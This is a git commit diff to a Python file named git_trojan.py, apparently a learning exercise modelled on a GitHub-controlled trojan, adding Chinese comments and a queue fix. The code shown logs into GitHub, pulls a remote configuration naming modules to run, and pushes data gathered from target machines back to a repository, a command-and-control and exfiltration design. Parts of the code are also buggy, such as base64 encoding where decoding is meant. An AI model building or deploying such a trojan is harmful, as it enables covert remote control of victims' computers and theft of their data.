f0c30f8431b1fd394c2feb31521cbad06c9eeb9d
qk13warcraft <qk13warcraft@163.com>
2017-05-25 12:53:21 +0800

    Adding GitHub connect 2

--- git_trojan.py
+++ git_trojan.py
@@ -12,20 +12,20 @@
  from github3 import login
 
  """
- 木马是主体框架，从GitHub上下载配置选项和运行的模块代码
+ 木马主体框架，从GitHub上下载配置选项和运行的模块代码
  """
 
- trojan_id = "abc"
+ trojan_id = "abc"  #唯一标识了木马文件
 
  trojan_config = "%s.json" %trojan_id
  data_path = "data/%s/" %trojan_id
  trojan_modules = []
  configured = False
- task_queue
+ task_queue = Queue.Queue()
 
  def connect_to_github():
  	"""
- 	链接github
+ 	连接github，对用户进行认证，获取当前的repo和branch的对象提供给其他函数使用
  	"""
  	gh = login(username="yourusername,"password = "yourpassword")
  	repo = gh.repository("yourusername","chapter7")
@@ -34,6 +34,9 @@
  	return gh,repo,branch
 
  def get_file_contents(filepath):
+ 	"""
+ 	从远程的repo中抓取文件，将文件内容读取到本地变量中
+ 	"""
  	gh,repo,branch = connect_to_github()
  	tree = branch.commit.commit.tree.recurse()
 
@@ -46,6 +49,9 @@
 
 
  def get_trojan_config():
+ 	"""
+ 	获得repo中的远程配置文件，木马解析其中的内容获得需要运行的模块名称
+ 	"""
  	global configured
  	config_json = get_file_contents(trojan_config)
  	config = json.loads(base64.b64encode(config_json))
@@ -57,6 +63,9 @@
  	return config
 
  def store_module_result(data):
+ 	"""
+ 	将从目标机器上手机的数据推送到repo中
+ 	"""
  	gh,repo,branch = connect_to_github()
  	remote_path = "data/%s/%d.data" %(trojan_id,random.randint(1000,100000))
  	repo.create_file(remote_path,"Commit message",base64.b64encode(data))
